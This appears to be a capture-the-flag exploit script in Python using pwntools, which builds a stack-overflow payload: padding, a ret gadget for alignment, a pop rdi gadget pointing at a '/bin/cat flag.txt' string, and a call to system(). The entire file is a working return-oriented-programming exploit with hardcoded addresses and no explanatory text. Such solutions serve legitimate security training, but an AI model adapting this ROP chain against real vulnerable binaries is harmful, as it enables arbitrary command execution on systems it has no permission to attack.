#!/usr/bin/python3
# coding: utf-8

from pwn import *
import sys

buf  = b'A' * 40
buf += p64(0x040053e) # ret gadget / Ubuntu 18.04 align stack

# set string
buf += p64(0x04007c3) # pop rdi
buf += p64(0x00601060) # "/bin/cat flag.txt" string

buf += p64(0x0400560) # system addr

sys.stdout.buffer.write(buf)
